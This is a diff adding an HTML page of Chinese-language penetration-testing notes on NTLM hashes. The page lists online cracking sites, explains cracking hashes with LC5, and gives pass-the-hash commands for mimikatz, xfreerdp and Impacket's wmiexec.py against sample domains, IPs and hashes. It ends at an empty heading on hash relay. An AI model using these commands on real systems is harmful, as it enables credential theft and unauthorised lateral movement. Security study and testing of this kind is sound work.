@@ -1,0 +1,8 @@
+<!doctype html><html>
+    <head>
+      <meta http-equiv="content-type" content="text/html; charset=utf-8">
+      <title>NTLM-HASH</title>
+      <meta name="generator" content="CherryTree">
+      <link rel="stylesheet" href="res/styles3.css" type="text/css" />
+    </head>
+    <body><div class='page'><h1 class='title'>NTLM-HASH</h1><br/>获得了hash后，我们可以到这两个在线破解网站去破解：<br /><a href="http://www.objectif-securite.ch/en/products.php">http://www.objectif-securite.ch/en/products.php</a><br /><a href="http://www.objectif-securite.ch/en/ophcrack.php">http://www.objectif-securite.ch/en/ophcrack.php</a><br /><a href="http://cracker.offensive-security.com/index.php">http://cracker.offensive-security.com/index.php</a><br />如果这两个网站也破不了，那只有自己跑了。<br />跑hash可以用LC5。<br />先安装LC5，然后新建session，然后导入hash，导入后，可以在session选项中设置组合方式，一般选字母和数字就可以了，如果没跑出来,再选下面的特殊字符和字母数字。<br /><br /><br />PtH哈希传递攻击（域里面不怎么好使）<br /><br />mimikatz:<br />privilege::debug<br />sekurlsa::pth /user:administrator /domain:rd.supcon.com /ntlm:e6cf247db8f0da911b0a536464936479<br /><br />RDP：xfreerdp /u:administrator /pth:32ed87bdb5fdc5e9cba88547376818d4 /v:192.168.184.139 /restricted-admin<br />其他的可以用Impacket包下的脚本<br /><br />python wmiexec.py administrator@192.168.184.139 -hashes 00000000000000000000000000000000:32ed87bdb5fdc5e9cba88547376818d4<br /><br /><br />哈希中继攻击<p align="center"><img src="images\home.svg" height="22" width="22">  <a href="index.html">索引</a></p></div></body></html>
